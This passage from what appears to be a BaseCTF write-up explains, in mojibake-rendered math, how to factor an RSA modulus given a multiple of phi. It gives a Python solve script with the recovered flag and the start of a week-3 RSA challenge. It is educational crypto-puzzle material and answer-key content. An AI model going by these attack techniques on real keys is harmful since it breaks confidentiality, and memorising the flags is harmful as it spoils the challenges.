mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">å› </span><span class="mord cjk_fallback">ä¸º</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">åˆ</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">åª</span><span class="mord cjk_fallback">è¦</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel">î€ </span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">Â±</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">åˆ™</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">ç§°</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">æ¨¡</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ä¸‹</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">é</span><span class="mord cjk_fallback">å¹³</span><span class="mord cjk_fallback">å‡¡</span><span class="mord cjk_fallback">å¹³</span><span class="mord cjk_fallback">æ–¹</span><span class="mord cjk_fallback">æ ¹</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ï¼ˆ</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">é‡Œ</span><span class="mord cjk_fallback">åª</span><span class="mord cjk_fallback">éœ€</span><span class="mord cjk_fallback">è¦</span><span class="mord cjk_fallback">åˆ¤</span><span class="mord cjk_fallback">æ–­</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel">î€ </span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">å› </span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">å‡º</span><span class="mord cjk_fallback">è®¡</span><span class="mord cjk_fallback">ç®—</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">å·²</span><span class="mord cjk_fallback">ç»</span><span class="mord cjk_fallback">è®¡</span><span class="mord cjk_fallback">ç®—</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">é</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">ä¸</span><span class="mord cjk_fallback">ç­‰</span><span class="mord cjk_fallback">äº</span><span class="mord">1</span><span class="mord cjk_fallback">äº†</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback">å¾—</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">å¾—</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å› </span><span class="mord cjk_fallback">ä¸º</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">åˆ</span><span class="mord cjk_fallback">æ•°</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">å¾—</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">æˆ–</span><span class="mord cjk_fallback">è€…</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">é‡Œ</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">æŒ‡</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ä¸­</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">å› </span><span class="mord cjk_fallback">æ•°</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">é‚£</span><span class="mord cjk_fallback">ä¹ˆ</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">é€š</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">æ±‚</span><span class="mord cjk_fallback">è§£</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">æˆ–</span><span class="mord cjk_fallback">è€…</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">åˆ°</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">è§£</span><span class="mord cjk_fallback">äº†</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ï¼ˆ</span><span class="mord cjk_fallback">æ‰€</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">ç®—</span><span class="mord cjk_fallback">æ³•</span><span class="mord cjk_fallback">ä¸­</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">ä¸­</span><span class="mord cjk_fallback">çš„</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord cjk_fallback">æ”¹</span><span class="mord cjk_fallback">æˆ</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">ä¹Ÿ</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ï¼‰</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_factors</span>(<span class="hljs-params">N, gift</span>):<br>    ans=[]<br>    factors=[N]<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(factors)&gt;<span class="hljs-number">0</span>:<br>        N=factors[<span class="hljs-number">0</span>]<br>        w = randrange(<span class="hljs-number">2</span>, N - <span class="hljs-number">1</span>)<br><br>        s = <span class="hljs-number">0</span><br>        a_1 = <span class="hljs-built_in">pow</span>(w, gift * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,s), N)<br>        <span class="hljs-keyword">while</span> a_1!=<span class="hljs-number">1</span>:<br>            s=s+<span class="hljs-number">1</span><br>            a_1 = <span class="hljs-built_in">pow</span>(w, gift * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,s), N)<br>        <br>        <span class="hljs-keyword">if</span> s!=<span class="hljs-number">0</span>:<br>            a_2 = <span class="hljs-built_in">pow</span>(w, gift * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,s-<span class="hljs-number">1</span>), N)<br>            <span class="hljs-keyword">if</span> a_2!=N-<span class="hljs-number">1</span>:<br>                p = gcd(N, a_2 + <span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">if</span> p!=<span class="hljs-number">1</span>:<br>                    q=N//p<br>                    factors=factors[<span class="hljs-number">1</span>:]<br>                    <span class="hljs-keyword">if</span> isPrime(p):<br>                        ans.append(p)<br>                    <span class="hljs-keyword">else</span>:<br>                        factors.append(p)<br>                    <span class="hljs-keyword">if</span> isPrime(q):<br>                        ans.append(q)<br>                    <span class="hljs-keyword">else</span>:<br>                        factors.append(q)<br>    <span class="hljs-keyword">return</span> ans<br>N = <span class="hljs-number">162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259</span><br>c = <span class="hljs-number">113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095</span><br>gift = <span class="hljs-number">863514692222931709925579242743251211976114217396765747601042357918763818732391790491059528595917786523674732369068315533549380754409535403506339052401422249684188032949680148055803474336983973622610403448963752802490806614810077181934627694570685722842963961551889267501616799757825675192653489096007790143775773378495299981666657347802233798206597104474595281241837323214457344961462510183726339545608046357281265026013496037522835659867389206279894057481600882665189079672009577651494435000349624334685832217586703242422260870866432379257259316411280539845741932725104662417642890238587876489774492067722351467773093391502588019563488688309892102039611978767690653206664257400163618467825666105966072942726011447079204869750153256054140924951306811971422635104088608275908232688385437145325481792836532453258784103533536292492138405929815964841772656055397705840797739586953744563989819811944946916720655079908564653686456283647030055622241840292127096994325415897266379446446435164189216562921252341705747891518007710533906231225283309180960546212899099652226954393826875</span><br><br><br>primes=my_factors(N,gift)<br><span class="hljs-built_in">print</span>(primes)<br>permutation=itertools.combinations(primes,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> permutation:<br>    p,q=i<br>    p,q=<span class="hljs-built_in">int</span>(p),<span class="hljs-built_in">int</span>(q)<br>    flag=long_to_bytes(<span class="hljs-built_in">pow</span>(c,inverse(<span class="hljs-number">65537</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),p*q))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;BaseCTF&#123;ed4bff90-d1f4-4f0f-a3bd-999c54d9eeb7&#125;;\xef\xd7&quot;X\xceglz\xc2l\xc3\xf0\x04\n$I\x00\xda\rT\xc5\xef\xc9t]\x0c\xae@\xdcO5\x02\xa8\xd6/&#123;5\xacD5\xda\x11&#123;\x80\x80\xa3\t#\x97\x871L\x10\r\x122z\xe1\x89%\x85\xdb\x94&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h2><h3 id="æ²¡æœ‰nå•Š"><a class="markdownIt-Anchor" href="#æ²¡æœ‰nå•Š"></a> æ²¡æœ‰nå•Š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>p=getPrime(<span class="hljs-number">512</span>)<br>q=getPrime(<span class="hljs-number">512</span>)<br><br>n=p*q<br>e=<span class="hljs-number">65537</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>x=<span class="hljs-built_in">pow</span>(n,e,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d =&quot;</span>,d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x =&quot;</span>,x)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 52453423663797600504896811946820841317615798875871627840172711423749946998217916744135290476795328543876098295227017753117609268701786914053599060330837226980969490439739651088710549890669593587642238827462108900683237797139569260570711611781514337884756698142193277516649805710242748531658979160170193283558</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">d = 